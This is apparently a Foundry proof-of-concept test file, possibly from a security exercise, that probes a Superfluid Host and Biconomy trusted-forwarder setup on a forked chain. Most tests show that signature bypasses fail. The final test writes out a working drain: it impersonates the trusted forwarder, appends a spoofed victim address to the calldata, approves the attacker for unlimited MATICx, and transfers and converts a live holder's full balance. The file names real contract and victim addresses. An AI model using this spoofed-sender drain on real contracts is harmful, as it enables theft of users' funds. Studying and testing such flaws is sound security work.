// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

struct Operation {
    uint32 operationType;
    address target;
    bytes data;
}

struct ForwardRequest {
    address from;
    address to;
    address token;
    uint256 txGas;
    uint256 tokenGasPrice;
    uint256 batchId;
    uint256 batchNonce;
    uint256 deadline;
    bytes data;
}

interface IBiconomyForwarder {
    function owner() external view returns (address);

    function domains(bytes32 domainSeparator) external view returns (bool);

    function getNonce(address from, uint256 batchId) external view returns (uint256);

    function executeEIP712(ForwardRequest calldata req, bytes32 domainSeparator, bytes calldata sig)
        external
        returns (bool success, bytes memory ret);

    function executePersonalSign(ForwardRequest calldata req, bytes calldata sig)
        external
        returns (bool success, bytes memory ret);
}

interface ISuperfluidHostLike {
    function isTrustedForwarder(address forwarder) external view returns (bool);

    function forwardBatchCall(Operation[] calldata operations) external payable;
}

interface IMATICxLike {
    function allowance(address owner, address spender) external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function downgradeToETH(uint256 wad) external;

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

/// @title Attempt21
/// @notice Attempt24 hypothesis executed in the next free attempt slot:
///         the Host-side trusted-forwarder sink is real, but the live Biconomy
///         forwarder appears to keep the attacker out on this fork.
/// @dev The fork Host still trusts the Biconomy forwarder for
///      `forwardBatchCall`, and `_getTransactionSigner()` still reads the last
///      20 calldata bytes as the relayed signer. The verified forwarder source
///      at `0x86C80a8a...` shows the remaining question is signature gating:
///      `executePersonalSign` requires `recover(sig) == req.from`, while
///      `executeEIP712` adds `require(chainId == block.chainid, "potential replay attack on the fork")`.
/// @dev This PoC therefore tests four concrete things on the live fork:
///      1. a real `executePersonalSign` control path to
///         `Host.forwardBatchCall -> operationApprove`,
///      2. non-recoverable / wrong-signer personal-sign failures,
///      3. EIP-712 failure on chain id `2403` even with the registered domain,
///      4. a direct trusted-forwarder control showing the downstream Host sink
///         can drain a live MATICx holder if the forwarder layer is ever bypassed.
contract Attempt21 is Test {
    uint256 internal constant FORK_BLOCK = 27_039_967;

    uint32 internal constant OPERATION_TYPE_ERC20_APPROVE = 1;
    uint256 internal constant PERSONAL_SIGN_ALLOWANCE = 123456789;
    uint256 internal constant FORWARD_TX_GAS = 500_000;

    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address internal constant HOST_ADDR = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address internal constant FORWARDER_ADDR = 0x86C80a8aa58e0A4fa09A69624c31Ab2a6CAD56b8;
    address internal constant MATICX_ADDR = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address internal constant FORWARDER_OWNER = 0xbb3982c15D92a8733e82Db8EBF881D979cFe9017;
    address internal constant LIVE_MATICX_VICTIM = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;

    bytes32 internal constant REGISTERED_DOMAIN_SEPARATOR =
        0x77959d40760f0cd2a578ba1067bb7450f052b730584fc9654556baa9e28e6a42;
    bytes32 internal constant REQUEST_TYPEHASH = keccak256(
        "ERC20ForwardRequest(address from,address to,address token,uint256 txGas,uint256 tokenGasPrice,uint256 batchId,uint256 batchNonce,uint256 deadline,bytes data)"
    );

    IBiconomyForwarder internal constant FORWARDER = IBiconomyForwarder(FORWARDER_ADDR);
    ISuperfluidHostLike internal constant HOST = ISuperfluidHostLike(HOST_ADDR);
    IMATICxLike internal constant MATICX = IMATICxLike(MATICX_ADDR);

    address internal spender;
    uint256 internal attackerKey;

    function setUp() public {
        vm.createSelectFork("ch5", FORK_BLOCK);

        spender = makeAddr("spender");
        attackerKey = vm.envUint("PRIVATE_KEY");

        vm.label(ATTACKER, "Attacker");
        vm.label(HOST_ADDR, "SuperfluidHost");
        vm.label(FORWARDER_ADDR, "BiconomyForwarder");
        vm.label(MATICX_ADDR, "MATICx");
        vm.label(LIVE_MATICX_VICTIM, "LiveMATICxVictim");
        vm.label(spender, "PoCSpender");

        assertEq(vm.addr(attackerKey), ATTACKER, "PRIVATE_KEY must correspond to the student EOA");
    }

    function test_executePersonalSign_controls_forwardBatchCall_on_live_forwarder() public {
        _logPreflight();

        Operation[] memory ops = new Operation[](1);
        ops[0] = _approveOperation(spender, PERSONAL_SIGN_ALLOWANCE);

        ForwardRequest memory req = _buildRequest(ATTACKER, 11, ops);
        uint256 nonceBefore = FORWARDER.getNonce(req.from, req.batchId);
        bytes memory sig = _signPersonal(req, nonceBefore, attackerKey);

        (bool success, bytes memory ret) = FORWARDER.executePersonalSign(req, sig);

        console.log("[personalSign control] success:", success);
        console.log("[personalSign control] ret bytes:", ret.length);
        console.log("[personalSign control] nonce before:", nonceBefore);
        console.log("[personalSign control] nonce after:", FORWARDER.getNonce(req.from, req.batchId));
        console.log("[personalSign control] allowance:", MATICX.allowance(ATTACKER, spender));

        assertTrue(success, "live executePersonalSign control should succeed");
        assertEq(ret.length, 0, "forwardBatchCall should not return bytes");
        assertEq(FORWARDER.getNonce(req.from, req.batchId), nonceBefore + 1, "nonce should increment");
        assertEq(
            MATICX.allowance(ATTACKER, spender),
            PERSONAL_SIGN_ALLOWANCE,
            "forwarder should append ATTACKER and let Host approve through operationApprove"
        );
    }

    function test_executePersonalSign_signature_bypass_is_closed() public {
        Operation[] memory ops = new Operation[](1);
        ops[0] = _approveOperation(ATTACKER, type(uint256).max);

        ForwardRequest memory req = _buildRequest(LIVE_MATICX_VICTIM, 12, ops);
        uint256 nonce = FORWARDER.getNonce(req.from, req.batchId);

        bytes memory nonRecoverableSig = _nonRecoverableSignature();
        vm.expectRevert(bytes("ECDSA: invalid signature"));
        FORWARDER.executePersonalSign(req, nonRecoverableSig);

        bytes memory wrongSignerSig = _signPersonal(req, nonce, attackerKey);
        vm.expectRevert(bytes("signature mismatch"));
        FORWARDER.executePersonalSign(req, wrongSignerSig);

        assertEq(
            MATICX.allowance(LIVE_MATICX_VICTIM, ATTACKER),
            0,
            "failed personal-sign attempts must not touch victim allowance"
        );
    }

    function test_executeEIP712_reverts_on_fork_chain_id_even_with_registered_domain() public {
        Operation[] memory ops = new Operation[](1);
        ops[0] = _approveOperation(spender, PERSONAL_SIGN_ALLOWANCE + 1);

        ForwardRequest memory req = _buildRequest(ATTACKER, 13, ops);
        uint256 nonce = FORWARDER.getNonce(req.from, req.batchId);
        bytes memory sig = _signEIP712(req, nonce, REGISTERED_DOMAIN_SEPARATOR, attackerKey);

        console.log("[eip712] domain registered:", FORWARDER.domains(REGISTERED_DOMAIN_SEPARATOR));
        console.log("[eip712] block.chainid:", block.chainid);
        console.log("[eip712] forwarder owner:", FORWARDER.owner());

        assertTrue(FORWARDER.domains(REGISTERED_DOMAIN_SEPARATOR), "registered domain separator not found");
        assertEq(FORWARDER.owner(), FORWARDER_OWNER, "unexpected forwarder owner");

        vm.expectRevert(bytes("potential replay attack on the fork"));
        FORWARDER.executeEIP712(req, REGISTERED_DOMAIN_SEPARATOR, sig);

        assertEq(MATICX.allowance(ATTACKER, spender), 0, "failed EIP712 execution must not mutate allowance");
    }

    function test_direct_trusted_forwarder_control_can_drain_live_victim_maticx() public {
        uint256 victimBalanceBefore = MATICX.balanceOf(LIVE_MATICX_VICTIM);
        uint256 allowanceBefore = MATICX.allowance(LIVE_MATICX_VICTIM, ATTACKER);
        uint256 attackerNativeBefore = ATTACKER.balance;

        console.log("[trusted-forwarder control] victim MATICx before:", victimBalanceBefore);
        console.log("[trusted-forwarder control] allowance before:", allowanceBefore);
        console.log("[trusted-forwarder control] attacker native before:", attackerNativeBefore);

        assertGt(victimBalanceBefore, 0, "control victim should hold live MATICx");

        Operation[] memory ops = new Operation[](1);
        ops[0] = _approveOperation(ATTACKER, type(uint256).max);

        bytes memory payload =
            abi.encodePacked(abi.encodeCall(HOST.forwardBatchCall, (ops)), bytes20(LIVE_MATICX_VICTIM));

        vm.prank(FORWARDER_ADDR);
        (bool ok, bytes memory ret) = HOST_ADDR.call(payload);

        console.log("[trusted-forwarder control] host call ok:", ok);
        console.log("[trusted-forwarder control] host ret bytes:", ret.length);
        console.log("[trusted-forwarder control] allowance after:", MATICX.allowance(LIVE_MATICX_VICTIM, ATTACKER));

        assertTrue(ok, _decodeRevert(ret));
        assertEq(
            MATICX.allowance(LIVE_MATICX_VICTIM, ATTACKER),
            type(uint256).max,
            "host should approve the spoofed victim when called from the trusted forwarder"
        );

        vm.prank(ATTACKER);
        bool moved = MATICX.transferFrom(LIVE_MATICX_VICTIM, ATTACKER, victimBalanceBefore);
        assertTrue(moved, "transferFrom should succeed after spoofed approval");

        vm.prank(ATTACKER);
        MATICX.downgradeToETH(victimBalanceBefore);

        uint256 attackerNativeAfter = ATTACKER.balance;

        console.log("[trusted-forwarder control] victim MATICx after:", MATICX.balanceOf(LIVE_MATICX_VICTIM));
        console.log("[trusted-forwarder control] attacker MATICx after:", MATICX.balanceOf(ATTACKER));
        console.log("[trusted-forwarder control] attacker native after:", attackerNativeAfter);
        console.log("[trusted-forwarder control] native delta:", attackerNativeAfter - attackerNativeBefore);

        assertEq(MATICX.balanceOf(LIVE_MATICX_VICTIM), 0, "control drain should zero the victim MATICx balance");
        assertEq(MATICX.balanceOf(ATTACKER), 0, "attacker should fully downgrade the drained MATICx");
        assertEq(
            attackerNativeAfter - attackerNativeBefore,
            victimBalanceBefore,
            "native gain should match the spoof-drained MATICx balance"
        );
    }

    function _buildRequest(address from, uint256 batchId, Operation[] memory ops)
        internal
        view
        returns (ForwardRequest memory req)
    {
        req.from = from;
        req.to = HOST_ADDR;
        req.token = MATICX_ADDR;
        req.txGas = FORWARD_TX_GAS;
        req.tokenGasPrice = 0;
        req.batchId = batchId;
        req.batchNonce = 0;
        req.deadline = block.timestamp + 1 hours;
        req.data = abi.encodeCall(HOST.forwardBatchCall, (ops));
    }

    function _approveOperation(address spender_, uint256 amount) internal pure returns (Operation memory op) {
        op.operationType = OPERATION_TYPE_ERC20_APPROVE;
        op.target = MATICX_ADDR;
        op.data = abi.encode(spender_, amount);
    }

    function _signPersonal(ForwardRequest memory req, uint256 nonce, uint256 signingKey)
        internal
        returns (bytes memory sig)
    {
        bytes32 digest = keccak256(
            abi.encodePacked(
                req.from,
                req.to,
                req.token,
                req.txGas,
                req.tokenGasPrice,
                req.batchId,
                nonce,
                req.deadline,
                keccak256(req.data)
            )
        );
        bytes32 prefixedDigest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest));
        return _signDigest(prefixedDigest, signingKey);
    }

    function _signEIP712(ForwardRequest memory req, uint256 nonce, bytes32 domainSeparator, uint256 signingKey)
        internal
        returns (bytes memory sig)
    {
        bytes32 structHash = keccak256(
            abi.encode(
                REQUEST_TYPEHASH,
                req.from,
                req.to,
                req.token,
                req.txGas,
                req.tokenGasPrice,
                req.batchId,
                nonce,
                req.deadline,
                keccak256(req.data)
            )
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
        return _signDigest(digest, signingKey);
    }

    function _signDigest(bytes32 digest, uint256 signingKey) internal returns (bytes memory sig) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signingKey, digest);
        sig = abi.encodePacked(r, s, v);
    }

    function _nonRecoverableSignature() internal pure returns (bytes memory sig) {
        sig = new bytes(65);
        assembly {
            mstore(add(sig, 0x40), 1)
            mstore8(add(sig, 0x60), 27)
        }
    }

    function _decodeRevert(bytes memory data) internal pure returns (string memory) {
        if (data.length == 0) {
            return "<empty>";
        }
        if (data.length >= 4) {
            bytes4 selector;
            assembly {
                selector := mload(add(data, 0x20))
            }
            if (selector == 0x08c379a0 && data.length >= 68) {
                (, string memory reason) = abi.decode(data, (bytes4, string));
                return reason;
            }
        }
        return "non-standard revert";
    }

    function _logPreflight() internal view {
        console.log("[preflight] chain id:", block.chainid);
        console.log("[preflight] fork block:", block.number);
        console.log("[preflight] host trusts forwarder:", HOST.isTrustedForwarder(FORWARDER_ADDR));
        console.log("[preflight] forwarder code size:", FORWARDER_ADDR.code.length);
        console.log("[preflight] forwarder owner:", FORWARDER.owner());
        console.log("[preflight] registered domain:", FORWARDER.domains(REGISTERED_DOMAIN_SEPARATOR));
        console.log("[preflight] live victim MATICx:", MATICX.balanceOf(LIVE_MATICX_VICTIM));

        assertTrue(HOST.isTrustedForwarder(FORWARDER_ADDR), "host no longer trusts Biconomy forwarder");
        assertEq(FORWARDER_ADDR.code.length, 5340, "unexpected forwarder runtime size");
    }
}
